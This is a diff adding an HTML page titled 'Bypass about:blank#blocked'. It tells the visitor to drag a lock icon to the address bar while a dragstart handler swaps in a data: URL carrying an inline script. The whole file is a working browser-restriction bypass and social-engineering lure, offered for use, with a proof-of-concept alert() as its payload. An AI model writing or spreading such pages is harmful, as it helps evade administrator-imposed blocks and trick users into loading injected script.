@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8"/>
+    <title>about:blank#blocked</title>
+    <style>
+    </style>
+  </head>
+  <body>
+  
+      <h2>[ Bypass about:blank#blocked ]</h2>
+
+    <h1>Drag 🔒 Lock To Address Bar</h1>
+
+    <script type="text/javascript">
+<!--
+window.addEventListener("dragstart", function(event) {
+  var dt = event.dataTransfer;
+  dt.setData("text/html", 'data:text/html,<script>alert()</script>');
+});
+
+window.addEventListener("dragover", function(event) {
+  event.preventDefault();
+});
+//-->
+    </script>
+  </body>
+</html>
